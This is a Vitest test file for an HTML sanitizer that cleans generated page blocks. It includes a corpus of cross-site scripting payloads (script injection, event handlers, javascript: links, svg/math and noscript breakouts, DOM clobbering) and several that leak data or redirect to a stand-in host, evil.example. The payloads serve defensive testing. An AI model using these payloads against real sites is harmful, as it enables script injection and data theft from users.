import { describe, expect, it } from "vitest";
import { droppedClassRatio, sanitizeBlock, sanitizeSurfaceClasses } from "./sanitize";
import { elements, parseSanitized } from "./tree";

const ctx = { blockId: "b-hero", screenIds: ["s-pricing"] };
const wrap = (inner: string, attrs = 'class="@container py-section"') => `<section data-block-id="b-hero" ${attrs}>${inner}</section>`;
const clean = (inner: string) => {
  const result = sanitizeBlock(wrap(inner), ctx);
  if (!result.ok) throw new Error(`failed: ${result.failure}`);
  return result;
};

/** Things that must never survive, whatever the wrapping. */
const FORBIDDEN = [/<script/i, /javascript:/i, /<iframe/i, /<svg/i, /<math/i, /<style/i, /\sstyle=/i, /\ssrc=/i, /srcdoc/i, /<object/i, /<embed/i, /<form/i, /<base/i, /<meta/i, /<link/i, /url\(/i, /xlink/i];

const CORPUS = [
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  '<img data-placeholder="photo" src="https://evil.example/t.png" alt="x">',
  "<a href=\"javascript:alert(1)\">x</a>",
  "<a href=\"JaVaScRiPt:alert(1)\">x</a>",
  "<a href=\"&#106;avascript:alert(1)\">x</a>",
  '<a href="https://evil.example">x</a>',
  "<div onclick=\"alert(1)\" onmouseover=alert(2)>x</div>",
  '<div style="background:url(https://evil.example/leak)">x</div>',
  '<div class="bg-[url(https://evil.example/leak)]">x</div>',
  "<svg><script>alert(1)</script></svg>",
  "<svg onload=alert(1)><a xlink:href=\"javascript:alert(1)\">x</a></svg>",
  "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
  "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
  "<object data=\"x.swf\"></object><embed src=x>",
  "<form action=\"https://evil.example\"><input name=p type=password><button formaction=\"https://evil.example\">go</button></form>",
  "<style>@import url(https://evil.example/x.css)</style>",
  "<template><script>alert(1)</script></template>",
  "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></noscript>",
  "<base href=\"https://evil.example/\"><meta http-equiv=refresh content=\"0;url=https://evil.example\"><link rel=stylesheet href=x>",
  "<p>a<!-- <img src=x onerror=alert(1)> --></p>",
  "<xmp><img src=x onerror=alert(1)></xmp>",
  "<textarea></textarea><img src=x onerror=alert(1)></textarea>",
  "<select><option><img src=x onerror=alert(1)></option></select>",
  "<details open ontoggle=alert(1)>x</details>",
  "<video><source onerror=alert(1)></video>",
  "<a href=\"#screen:s-pricing\" onfocus=alert(1) autofocus>ok</a>",
  "<input type=image src=x onerror=alert(1)>",
  "<button formaction=javascript:alert(1)>x</button>",
  "<div id=\"__proto__\" name=\"location\">x</div>",
  "<img data-placeholder=\"photo\" alt=\"&quot; onerror=&quot;alert(1)\">",
];

describe("sanitizer (spec §6.2)", () => {
  it("keeps one root with the expected block id and re-serializes it", () => {
    const result = clean('<h1 class="text-h1 text-foreground">Hola</h1>');
    expect(result.html).toBe('<section class="@container py-section" data-block-id="b-hero"><h1 class="text-h1 text-foreground" data-dl-t="0">Hola</h1></section>');
  });

  it("forces the root's data-block-id to the expected one", () => {
    const result = sanitizeBlock('<div data-block-id="other" class="p-4"><p>x</p></div>', ctx);
    expect(result.ok && result.html).toContain('data-block-id="b-hero"');
  });

  it.each(CORPUS)("neutralizes %s", (payload) => {
    const result = sanitizeBlock(wrap(`<p>ok</p>${payload}`), ctx);
    if (!result.ok) return; // a failed block falls back to the base design: also safe
    for (const pattern of FORBIDDEN) expect(result.html, String(pattern)).not.toMatch(pattern);
    // Re-parsed like a browser would: no event handler attribute anywhere.
    for (const element of elements(parseSanitized(result.html))) {
      for (const [name] of element.attrs) expect(name).not.toMatch(/^on/i);
    }
  });

  it("drops classes outside the vocabulary and reports them", () => {
    const result = clean('<p class="text-white bg-[#f00] p-4 text-foreground md:flex">x</p>');
    expect(result.html).toContain('class="p-4 text-foreground"');
    expect(result.report.classesTotal).toBe(7);
    expect(result.report.classesKept).toBe(4);
    expect(droppedClassRatio(result.report)).toBeCloseTo(3 / 7);
  });

  it("rewrites links: only #screen:<existing id> survives", () => {
    const result = clean('<a href="#screen:s-pricing">a</a><a href="#screen:s-nope">b</a><a href="/x">c</a><a>d</a>');
    expect(result.html.match(/href="[^"]*"/g)).toEqual(['href="#screen:s-pricing"', 'href="#"', 'href="#"', 'href="#"']);
  });

  it("prefixes ids and their references (no DOM clobbering, no collisions between blocks)", () => {
    const result = clean('<label for="email">E</label><input id="email" type="email" aria-describedby="email-help"><p id="email-help">h</p>');
    expect(result.html).toContain('for="ai-b-hero-email"');
    expect(result.html).toContain('id="ai-b-hero-email"');
    expect(result.html).toContain('aria-describedby="ai-b-hero-email-help"');
  });

  it("keeps icons and placeholders, never a src", () => {
    const result = clean('<i data-icon="arrow-right" aria-hidden="true"></i><i data-icon="facebook"></i><img data-placeholder="avatar" alt="Ana"><img data-asset="logo" alt="Brisa"><img alt="no kind">');
    expect(result.html).toContain('data-icon="arrow-right"');
    expect(result.html).toContain('data-icon="dot"');
    expect(result.report.unknownIcons).toEqual(["facebook"]);
    expect(result.html).toContain('data-placeholder="avatar"');
    expect(result.html).toContain('data-asset="logo"');
    expect(result.html).toContain('<img alt="no kind" data-placeholder="photo">');
  });

  it("buttons are type=button and passwords have autocomplete off", () => {
    const result = clean('<button type="submit">Go</button><input type="password"><input type="file">');
    expect(result.html).toContain('<button type="button" data-dl-t="0">Go</button>');
    expect(result.html).toContain('<input type="password" autocomplete="off">');
    expect(result.html).toContain('<input type="text">');
  });

  it("counts hostile tags (the pipeline fails the block)", () => {
    expect(sanitizeBlock(wrap("<script>x</script><p>a</p>"), ctx).report.hostile).toBe(1);
    expect(sanitizeBlock(wrap("<svg></svg><p>a</p>"), ctx).report.hostile).toBe(1);
  });

  it("unwraps harmless unknown tags and keeps their text", () => {
    expect(clean("<center><font>Hola</font></center>").html).toContain("Hola");
    expect(clean("<b>x</b>").html).toContain("<strong");
  });

  it("fails instead of truncating over the caps", () => {
    expect(sanitizeBlock(wrap("<p>x</p>".repeat(3500)), ctx)).toMatchObject({ ok: false, failure: "too-large" });
    expect(sanitizeBlock(wrap("<span></span>".repeat(450)), ctx)).toMatchObject({ ok: false, failure: "too-many-elements" });
    expect(sanitizeBlock(wrap(`${"<div>".repeat(40)}x${"</div>".repeat(40)}`), ctx)).toMatchObject({ ok: false, failure: "too-deep" });
    expect(sanitizeBlock("just text", ctx)).toMatchObject({ ok: false, failure: "no-root" });
    expect(sanitizeBlock("<p>x</p>", ctx)).toMatchObject({ ok: false, failure: "wrong-root" });
  });

  it("escapes text and attributes on the way out", () => {
    const result = clean('<p title="x">&lt;script&gt;alert(1)&lt;/script&gt;</p><img data-placeholder="photo" alt="a &quot;b&quot; <c>">');
    expect(result.html).toContain("&lt;script&gt;alert(1)&lt;/script&gt;");
    expect(result.html).toContain('alt="a &quot;b&quot; &lt;c&gt;"');
    expect(result.html).not.toContain("title=");
  });

  it("marks elements with their own text for the inline edit", () => {
    const result = clean("<div><h2>A</h2><p>B <strong>C</strong></p></div>");
    expect(result.textNodes).toBe(3);
  });

  it("surface classes keep only the surface", () => {
    expect(sanitizeSurfaceClasses(["bg-card", "rounded-card", "shadow-card", "p-6", "flex", "text-foreground", "bg-[#fff]", "hover:bg-muted"])).toEqual(["bg-card", "rounded-card", "shadow-card", "p-6", "hover:bg-muted"]);
  });
});
